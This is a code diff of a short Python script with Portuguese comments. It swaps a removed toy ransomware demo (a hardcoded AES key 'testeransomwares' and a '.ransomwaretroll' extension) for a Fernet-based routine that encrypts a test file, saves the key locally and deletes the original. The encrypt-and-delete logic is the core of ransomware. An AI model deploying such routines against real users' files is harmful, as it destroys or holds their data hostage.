@@ -1,24 +1,34 @@
 import os
-import pyaes
+from cryptography.fernet import Fernet
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+def encrypt_file(filename, key=None):
+    # Gera ou usa a chave fornecida
+    if key is None:
+        key = Fernet.generate_key()
+        # Salva a chave em um arquivo
+        with open('filekey.key', 'wb') as filekey:
+            filekey.write(key)
+    
+    # Instancia o objeto Fernet
+    fernet = Fernet(key)
+    
+    # Abre e lê o arquivo original
+    with open(filename, 'rb') as file:
+        original = file.read()
+        
+    # Encripta o arquivo
+    encrypted = fernet.encrypt(original)
+    
+    # Salva o arquivo encriptado
+    encrypted_file = filename + '.encrypted'
+    with open(encrypted_file, 'wb') as file:
+        file.write(encrypted)
+        
+    # Remove o arquivo original
+    os.remove(filename)
+    
+    print(f'Arquivo {filename} encriptado!')
 
-## remover o arquivo
-os.remove(file_name)
-
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
-
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+if __name__ == "__main__":
+    filename = "arquivo_teste.txt"
+    encrypt_file(filename)
